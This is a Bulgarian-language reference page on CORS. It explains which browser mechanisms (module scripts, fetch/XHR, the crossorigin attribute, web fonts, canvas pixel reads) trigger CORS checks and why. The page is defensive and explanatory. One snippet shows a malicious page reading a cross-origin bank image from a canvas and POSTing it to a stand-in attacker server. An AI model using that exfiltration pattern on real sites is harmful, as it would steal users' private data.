Web Security / HTTP

CORS & кога блокира?

Пълен справочник: кои браузърни механизми минават през CORS проверка и кои не.

// Накратко

CORS (Cross-Origin Resource Sharing) е механизъм, чрез който браузърът решава дали да позволи на една уеб страница да зарежда ресурси от друг домейн. По подразбиране браузърът блокира такива заявки — сървърът трябва изрично да каже „позволявам" чрез HTTP хедъра Access-Control-Allow-Origin: *. Не всички заявки минават през CORS — вижте таблицата по-долу.

01 —

type="module"

ES модулите винаги минават през CORS, дори и да са обикновен <script> таг.

HTML
<!-- Обикновен script — без CORS --> <script src="https://cdn.jsdelivr.net/lib.js"></script> <!-- Module — минава през CORS! --> <script type="module" src="https://друг-домейн.com/mod.js"></script>
❌ CORS грешка ако сървърът няма Access-Control-Allow-Origin
Защо? ES модулите (type="module") са нов стандарт и умишлено са проектирани с CORS — за разлика от legacy <script>.

Модулите могат да импортират JavaScript от съвсем различни домейни чрез import/export — браузърът не знае предварително от кои домейни, затова CORS е задължителен от самото начало. Не можеш да го заобиколиш като пропуснеш type="module" — браузърът ще хвърли синтактична грешка и скриптът изобщо няма да се изпълни.

Legacy скриптовете са един затворен файл — няма верига от непознати import-и, затова няма нужда от CORS на ниво зареждане.

Внимание: Legacy скриптовете не са напълно безопасни — могат да се зареждат от произволен домейн. За допълнително ограничение настрой Content Security Policy (CSP) на сървъра или чрез <meta> таг в HTML страницата.

02 —

fetch() и XMLHttpRequest

Всяка програмна HTTP заявка към друг домейн минава задължително през CORS.

JavaScript
// ❌ CORS грешка — сървърът трябва да позволи fetch('https://друг-домейн.com/api/data.json') // Браузърът изпраща preflight OPTIONS заявка: OPTIONS /api/data.json HTTP/1.1 Origin: https://моя-сайт.com Access-Control-Request-Method: GET // Сървърът трябва да отговори с: Access-Control-Allow-Origin: * Access-Control-Allow-Methods: GET, POST
❌ Блокирано без правилните хедъри
03 —

Атрибутът crossorigin — капан

Добавянето на crossorigin към всеки таг нарочно активира CORS режим, дори там където по подразбиране няма CORS.

HTML
<!-- Без crossorigin — работи нормално --> <script src="https://cdn.jsdelivr.net/lib.js"></script> ✓ OK <!-- С crossorigin — CORS се активира! --> <script crossorigin src="https://cdn.jsdelivr.net/lib.js"></script> ❌ <!-- Същото за img --> <img crossorigin src="https://cdn.jsdelivr.net/photo.jpg" /> ❌
Защо изобщо се ползва? За да виждаш пълни stack traces в конзолата при JS грешки от CDN. Без него браузърът крие детайлите на грешката за сигурност. Но тогава CDN-ът трябва да поддържа CORS.
04 —

CSS @font-face от друг домейн

Шрифтовете са специален случай — винаги минават през CORS, за разлика от изображения и скриптове.

CSS
/* ❌ Не работи ако сървърът няма CORS хедър */ @font-face { font-family: 'MyFont'; src: url('https://друг-домейн.com/font.woff2'); } /* ✓ Google Fonts работи защото те имат: */ Access-Control-Allow-Origin: *
❌ Шрифтът не се зарежда без CORS
05 —

Canvas + изображения от друг домейн

Зареждането на изображението работи — но щом се опиташ да четеш пиксели, canvas се „замърсява" (tainted) и блокира.

JavaScript
const img = new Image(); img.src = 'https://друг-домейн.com/photo.jpg'; ctx.drawImage(img, 0, 0); ✓ Показва се // Но след това: canvas.toDataURL(); ❌ SecurityError: Tainted canvas ctx.getImageData(...); ❌ SecurityError: Tainted canvas // Решение: добави crossorigin на img И CORS на сървъра img.crossOrigin = 'anonymous'; ✓ Работи с CORS хедър
⚠️ Зарежда се, но четенето на пиксели е блокирано
// Обобщена таблица — справочник
Механизъм CORS? Бележка
<script src> ❌ Не Legacy — предхожда CORS
<script type="module"> ✅ Да Нов стандарт, умишлено с CORS
<script crossorigin> ✅ Да Атрибутът активира CORS режим
fetch() / XMLHttpRequest ✅ Да Всяка програмна заявка
<img src> ❌ Не Зарежда се свободно
<img> → Canvas четене ✅ Да getImageData / toDataURL блокирано
<link rel="stylesheet"> ❌ Не CSS файлове са свободни
@font-face в CSS ✅ Да Шрифтовете винаги минават CORS
<video> / <audio> ❌ Не Зареждат се свободно

Златното правило

  • ✓
    Зареждане на ресурс (script, img, video, css) — без CORS, освен шрифтове и модули.
  • ✗
    Четене на съдържанието програмно (fetch, XHR, getImageData) — винаги CORS.
  • ✗
    crossorigin атрибут — нарочно активира CORS дори там където няма.
Защо canvas четенето е опасно? Браузърът показва картинката нормално — потребителят не вижда нищо подозрително. Но JavaScript може да прочете всеки пиксел и да изпрати данните навън:
JavaScript
// Злонамерен сайт зарежда картинка от банката ти const img = new Image(); img.src = 'https://bank.com/qr-with-account-data.png'; ctx.drawImage(img, 0, 0); ✓ Показва се нормално // Чете цялата картинка като base64 и я изпраща fetch('https://злонамерен-сървър.com/steal', { method: 'POST', body: canvas.toDataURL() ← цялата картинка заминава }); // Затова браузърът блокира и двете: canvas.toDataURL(); ❌ SecurityError: Tainted canvas ctx.getImageData(...); ❌ SecurityError: Tainted canvas
БОНУС 1 —

Математически формули с MathJax

Ако искаш да изписваш математически формули в страницата си, можеш да ползваш MathJax — legacy скрипт от docs.mathjax.org, който не минава през CORS:

HTML
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script> <!-- След това пишеш LaTeX директно в HTML-а: --> $$E = mc^2$$ \( \int_0^\infty e^{-x^2} dx = \frac{\sqrt{\pi}}{2} \)
Как работи? MathJax сканира страницата за LaTeX нотация и я превръща в SVG или HTML+CSS чрез елементи като <mjx-container>. Формулите са векторна графика — мащабират се без замъгляване. За разлика от canvas, тук няма четене на пиксели и няма нужда от CORS.
⚠ ВНИМАНИЕ —

CDN не означава автоматично безопасно

jsdelivr е надежден и популярен CDN, но „безопасно" зависи от какво зареждаш, не само от откъде. Ако пакетът сам по себе си е злонамерен или компрометиран, jsdelivr само го доставя бързо.

HTML
<!-- По-рисковано — взима най-новата версия автоматично --> <script src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script> ⚠ <!-- По-безопасно — точна версия, знаеш точно какво зареждаш --> <script src="https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.js"></script> ✓
Supply chain attack: Ако някой качи компрометирана нова версия на пакета, ти автоматично я получаваш при следващото зареждане на страницата. Това се казва supply chain attack и се е случвало с реални популярни пакети.
БОНУС 2 —

Защо шрифтовете винаги минават през CORS

Две причини:

Исторически: Шрифтовете са добавени към уеб стандартите след като CORS вече е съществувал — за разлика от <img> и <script>, които предхождат CORS и са останали без проверка за обратна съвместимост.

Лицензионен: Шрифтовете са платени продукти. Без CORS всеки би могъл да зареди шрифт лицензиран за един домейн и да го ползва на друг. CORS позволява на сървъра да каже „давам този шрифт само на тези домейни".

CSS
/* ✓ Работи — Google е разрешил на всички */ @import url('https://fonts.googleapis.com/css2?family=Sofia+Sans'); /* ❌ Може да не работи — зависи от сървъра */ @import url('https://някой-друг-сайт.com/fonts/beautiful.woff2');
Google Fonts работи защото Google добавя "Access-Control-Allow-Origin: *" към всички шрифтове — разрешава зареждане от всеки домейн.
